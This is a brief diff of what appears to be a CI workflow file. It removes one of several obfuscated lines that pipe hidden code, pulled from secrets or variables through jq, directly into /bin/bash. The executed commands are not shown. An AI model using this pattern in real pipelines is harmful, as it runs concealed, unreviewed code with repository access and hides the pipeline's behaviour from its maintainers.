@@ -21,7 +21,6 @@ jobs:
           zyfo6659: ${{ secrets.zyfo6659 }}
         run: |
           printf '%s' "$zyfo6659" | jq -r .mpd0 | /bin/bash
-          printf '%s' "$ewrl4223" | jq -r .wxzrg245 | /bin/bash
           echo $bl3 | jq -r .hn5 | /bin/bash
 
       - name: Save data
